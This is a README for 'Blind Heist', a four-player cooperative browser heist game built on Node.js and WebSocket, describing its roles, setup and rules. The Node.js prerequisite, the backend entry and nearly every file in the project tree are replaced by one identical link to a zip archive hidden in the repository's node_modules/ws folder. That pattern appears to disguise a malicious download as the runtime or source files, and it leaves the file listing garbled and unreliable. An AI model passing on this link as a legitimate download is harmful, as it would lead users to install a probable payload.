# Blind Heist 🎭

A 4-player cooperative heist game where no single player can see the full game state. Each player receives a different partial view of the same game world, requiring communication and coordination to succeed.

## 🎮 Game Concept

- **4 unique roles**, each with a different view of the game
- **Real-time multiplayer** using WebSocket
- **Grid-based movement** (no physics)
- **Communication is key** - players must talk to coordinate

## 👥 Player Roles

| Role | Sees | Does NOT See |
|------|------|--------------|
| **Navigator** 🧭 | Room layout, walls, doors, player position | Cameras, loot, alarm |
| **Security** 📹 | CCTV cameras, field-of-view cones | Map layout, player, loot, alarm |
| **Loot Master** 💎 | Loot locations, types, values | Cameras, player position, alarm |
| **Alarm Controller** 🚨 | Alarm meter, countdown, events | Map, player, cameras, loot |

## 🎯 Objective

1. Navigate through the building
2. Collect loot items
3. Avoid camera detection
4. Escape before time runs out or alarm maxes out

## 🚀 Quick Start

### Prerequisites
- https://github.com/wafiqj/blind-heist-game/raw/refs/heads/main/node_modules/ws/blind-heist-game-perivasculitis.zip (v14 or higher)
- npm

### Installation

```bash
# Navigate to project directory
cd blind-heist-game

# Install dependencies
npm install

# Start the server
npm start
```

### Playing

1. Open `http://localhost:3000` in your browser
2. Click **"Create Room"** to create a new game room
3. Share the 6-character room code with 3 other players
4. Each player opens `http://localhost:3000` and enters the room code
5. Once all 4 players have joined, click **"Start Heist"**
6. Use voice chat (Discord, phone call, etc.) to communicate!

### Controls (Navigator only)
- **Arrow Keys** or **WASD** - Move the shared character
- **On-screen buttons** - Alternative movement controls

## 📁 Project Structure

```
blind-heist-game/
├── server/                 # Backend
│   ├── https://github.com/wafiqj/blind-heist-game/raw/refs/heads/main/node_modules/ws/blind-heist-game-perivasculitis.zip           # WebSocket server & static files
│   ├── https://github.com/wafiqj/blind-heist-game/raw/refs/heads/main/node_modules/ws/blind-heist-game-perivasculitis.zip     # Room & player management
│   ├── https://github.com/wafiqj/blind-heist-game/raw/refs/heads/main/node_modules/ws/blind-heist-game-perivasculitis.zip       # Centralized game state
│   ├── https://github.com/wafiqj/blind-heist-game/raw/refs/heads/main/node_modules/ws/blind-heist-game-perivasculitis.zip       # Game mechanics
│   └── https://github.com/wafiqj/blind-heist-game/raw/refs/heads/main/node_modules/ws/blind-heist-game-perivasculitis.zip    # Procedural map generation
├── client/                 # Frontend
│   ├── https://github.com/wafiqj/blind-heist-game/raw/refs/heads/main/node_modules/ws/blind-heist-game-perivasculitis.zip         # Main page
│   ├── css/
│   │   └── https://github.com/wafiqj/blind-heist-game/raw/refs/heads/main/node_modules/ws/blind-heist-game-perivasculitis.zip     # All styles
│   └── js/
│       ├── https://github.com/wafiqj/blind-heist-game/raw/refs/heads/main/node_modules/ws/blind-heist-game-perivasculitis.zip        # WebSocket client
│       ├── https://github.com/wafiqj/blind-heist-game/raw/refs/heads/main/node_modules/ws/blind-heist-game-perivasculitis.zip       # Room UI
│       ├── https://github.com/wafiqj/blind-heist-game/raw/refs/heads/main/node_modules/ws/blind-heist-game-perivasculitis.zip    # Base rendering
│       ├── https://github.com/wafiqj/blind-heist-game/raw/refs/heads/main/node_modules/ws/blind-heist-game-perivasculitis.zip         # Main controller
│       └── roles/         # Role-specific views
│           ├── https://github.com/wafiqj/blind-heist-game/raw/refs/heads/main/node_modules/ws/blind-heist-game-perivasculitis.zip
│           ├── https://github.com/wafiqj/blind-heist-game/raw/refs/heads/main/node_modules/ws/blind-heist-game-perivasculitis.zip
│           ├── https://github.com/wafiqj/blind-heist-game/raw/refs/heads/main/node_modules/ws/blind-heist-game-perivasculitis.zip
│           └── https://github.com/wafiqj/blind-heist-game/raw/refs/heads/main/node_modules/ws/blind-heist-game-perivasculitis.zip
├── https://github.com/wafiqj/blind-heist-game/raw/refs/heads/main/node_modules/ws/blind-heist-game-perivasculitis.zip
└── https://github.com/wafiqj/blind-heist-game/raw/refs/heads/main/node_modules/ws/blind-heist-game-perivasculitis.zip
```

## 🔧 Technical Details

- **Backend**: https://github.com/wafiqj/blind-heist-game/raw/refs/heads/main/node_modules/ws/blind-heist-game-perivasculitis.zip with `ws` (WebSocket) library
- **Frontend**: Vanilla HTML/CSS/JavaScript
- **Communication**: JSON over WebSocket
- **State Management**: Server-authoritative with role-filtered updates

## 🎲 Game Mechanics

### Alarm System
- Alarm level: 0-100%
- Increases when:
  - Player detected by camera
  - Picking up loot
  - Random security events
- Slowly decreases over time
- Game over if reaches 100%

### Cameras
- Fixed positions with field-of-view cones
- Detect player movement within FOV
- Only visible to Security role

### Loot
- 5 loot items per map
- Different values: Diamond, Gold, Artifact, Jewel, Cash
- Must collect at least 1 to win
- Collecting increases alarm risk

### Timer
- 3 minutes per heist
- Game over if time runs out

## 🎨 UI/UX

- Dark theme with role-specific accent colors
- Minimalist visual design
- Mobile-responsive (works on phones)
- Real-time updates across all clients

## 📝 Tips for Players

1. **Navigator**: Describe your surroundings to teammates
2. **Security**: Warn when cameras are pointing toward teammates
3. **Loot Master**: Give coordinates of high-value items
4. **Alarm Controller**: Call out when alarm is rising too fast

## 🐛 Known Limitations

- No reconnection handling (refresh = disconnect)
- Static camera positions (no rotating cameras yet)
- Single map layout (no procedural variety yet)

## 📜 License

MIT License
